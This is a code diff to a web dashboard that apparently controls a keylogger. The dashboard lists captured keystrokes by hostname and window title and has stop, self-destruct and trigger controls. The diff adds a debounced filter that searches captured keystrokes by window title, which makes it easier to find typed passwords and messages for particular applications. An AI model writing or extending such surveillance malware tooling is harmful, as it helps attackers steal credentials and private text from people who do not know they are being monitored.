@@ -66,6 +66,7 @@
             <option value="" disabled selected>Select a device...</option>
           </select>
         </div>
+        <input type="text" id="windowFilter" placeholder="Filter by window..." class="w-56 bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2 text-slate-300 placeholder-slate-500 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
         <button class="inline-flex items-center justify-center px-4 py-2 text-sm font-medium text-slate-300 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-lg transition" onclick="fetchKeys(true)">Refresh</button>
         <label class="inline-flex items-center cursor-pointer ml-2">
           <input type="checkbox" id="showSpam" onchange="fetchKeys(true)" class="sr-only peer">
@@ -269,12 +270,19 @@ function isSpam(s) {
   return true;
 }
 
+function debounce(fn, ms) {
+  let timer;
+  return function(...args) { clearTimeout(timer); timer = setTimeout(() => fn.apply(this, args), ms); };
+}
+
 async function fetchKeys(resetPage) {
   if (resetPage) currentPage = 0;
   try {
     let path = '/rest/v1/keystrokes?select=created_at,hostname,window_title,keys&order=created_at.desc&limit=' + PAGE_SIZE + '&offset=' + (currentPage * PAGE_SIZE);
     const filterHost = document.getElementById('hostnameInput').value.trim();
     if (filterHost) path += '&hostname=eq.' + encodeURIComponent(filterHost);
+    const filterWin = document.getElementById('windowFilter').value.trim();
+    if (filterWin) path += '&window_title=ilike.' + encodeURIComponent('*' + filterWin + '*');
     const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent(path), { headers: {} });
     if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
     const data = await res.json();
@@ -468,6 +476,7 @@ document.getElementById('stopBtn').addEventListener('click', sendStop);
 document.getElementById('destructBtn').addEventListener('click', sendDestruct);
 
 document.getElementById('hostnameInput').addEventListener('change', () => fetchKeys(true));
+document.getElementById('windowFilter').addEventListener('input', debounce(() => fetchKeys(true), 300));
 
 document.getElementById('triggerInput').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') addTrigger();
